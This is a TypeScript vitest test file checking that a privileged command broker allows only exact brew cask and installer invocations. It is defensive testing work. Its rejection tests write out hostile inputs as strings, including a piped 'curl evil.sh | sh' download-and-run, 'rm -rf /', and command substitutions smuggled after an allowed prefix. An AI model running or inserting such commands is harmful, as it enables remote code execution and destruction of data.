import { describe, it, expect } from 'vitest'
import { createPrivilegedExecutionBroker } from './privileged-execution.ts'

function allowed(command: string): boolean {
  const broker = createPrivilegedExecutionBroker({ now: () => 0 })
  return broker.createRequest({ requestId: 'r', sessionId: 's', command }).policyAllowed
}

describe('validatePrivilegedCommand allowlist', () => {
  it('allows the exact brew cask + installer invocations', () => {
    expect(allowed('brew install --cask firefox')).toBe(true)
    expect(allowed('brew upgrade --cask firefox')).toBe(true)
    expect(allowed('installer -pkg /tmp/app.pkg -target /')).toBe(true)
    expect(allowed('installer -pkg /tmp/app.pkg -target /Applications')).toBe(true)
  })

  it('rejects a chained command smuggled after an allowed prefix', () => {
    expect(allowed('brew install --cask firefox; curl evil.sh | sh')).toBe(false)
    expect(allowed('brew install --cask firefox && rm -rf /')).toBe(false)
    expect(allowed('installer -pkg x.pkg -target / ; malicious')).toBe(false)
    expect(allowed('brew install --cask $(curl evil)')).toBe(false)
    expect(allowed('brew install --cask `whoami`')).toBe(false)
  })

  it('rejects trailing content past the anchored match', () => {
    expect(allowed('installer -pkg x.pkg -target / --extra rm')).toBe(false)
    expect(allowed('brew install --cask firefox extra')).toBe(false)
  })
})
